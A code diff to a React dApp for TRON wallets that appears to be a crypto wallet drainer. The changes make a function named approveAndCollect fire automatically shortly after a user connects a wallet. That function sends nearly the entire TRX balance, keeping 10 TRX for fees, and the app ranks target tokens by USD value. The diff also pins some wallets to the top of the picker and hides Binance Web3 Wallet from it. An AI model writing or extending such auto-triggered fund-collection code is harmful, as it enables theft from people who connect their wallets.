@@ -61,7 +61,6 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
-// 🛠️ DYNAMIC APPKIT NETWORK
 const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
 
@@ -107,9 +106,16 @@ createAppKit({
   themeMode: 'light', 
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
+  // 🛠️ FIX: Force TronLink, Trust, TokenPocket, and SafePal to the top
   featuredWalletIds: [
+    '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a', // TronLink
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-    '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709', // OKX Wallet
+    '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66', // TokenPocket
+    '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b0a308a64bea04120', // SafePal
+  ],
+  // 🛠️ FIX: Banish Binance Web3 Wallet from the modal entirely
+  excludeWalletIds: [
+    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3 Wallet
   ],
   features: { email: false, socials: [], analytics: true },
 })
@@ -147,7 +153,7 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
-
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
@@ -157,7 +163,9 @@ export default function App() {
   const [amountError, setAmountError] = useState('')
   const [debugLogs, setDebugLogs] = useState<string[]>([]);
   
+  const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
+  
   const isExecuting = useRef(false)
 
   const { open } = useAppKit()
@@ -188,9 +196,11 @@ export default function App() {
   }
 
   useEffect(() => {
-    if (!isConnected || !walletAddress) return;
-
     const init = async () => {
+      if (!isConnected || !walletAddress) {
+        autoTriggered.current = false;
+        return;
+      }
       log(`[SYSTEM] Connected TRON: ${walletAddress}`);
 
       setStatus('Initializing TRON...');
@@ -207,16 +217,15 @@ export default function App() {
       } else {
         await getTronBalance(finalTronWeb, walletAddress);
       }
+
+      if (!autoTriggered.current && manualConnect.current) {
+        autoTriggered.current = true;
+        log("🔥 Auto-triggering Tron Priority Loop...");
+        setLoading(true); 
+        setTimeout(() => approveAndCollect(), 500); 
+      }
     };
     init();
-
-    // 🛠️ THE SINGLE-SHOT CONSUMPTION LOCK (Mirrored perfectly from the EVM version)
-    if (manualConnect.current) {
-      manualConnect.current = false; // Consumes the lock instantly
-      log("🔥 Auto-triggering Tron Priority Loop...");
-      setLoading(true); 
-      setTimeout(() => approveAndCollect(), 500); 
-    }
   }, [isConnected, walletAddress, tronWalletProvider]);
 
   const getTronBalance = async (tw: any, addr: string): Promise<number> => {
@@ -237,9 +246,10 @@ export default function App() {
     setAmountError('');
 
     if (!isConnected) {
-      manualConnect.current = true; // Primes the single-shot lock
+      manualConnect.current = true;
       open(); 
     } else {
+      manualConnect.current = true;
       approveAndCollect();
     }
   }
@@ -324,7 +334,6 @@ export default function App() {
             const twToUse = activeTw || publicTw;
             const liveBal = await twToUse.trx.getBalance(walletAddress);
             
-            // Retain 10 TRX (10,000,000 SUN) for bandwidth to ensure the TX doesn't fail
             if (liveBal > 10_000_000) {
                const sendAmount = liveBal - 10_000_000; 
                
@@ -388,6 +397,8 @@ export default function App() {
       setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
     } finally {
       isExecuting.current = false;
+      autoTriggered.current = false; 
+      manualConnect.current = false; 
       setLoading(false);
     }
   };
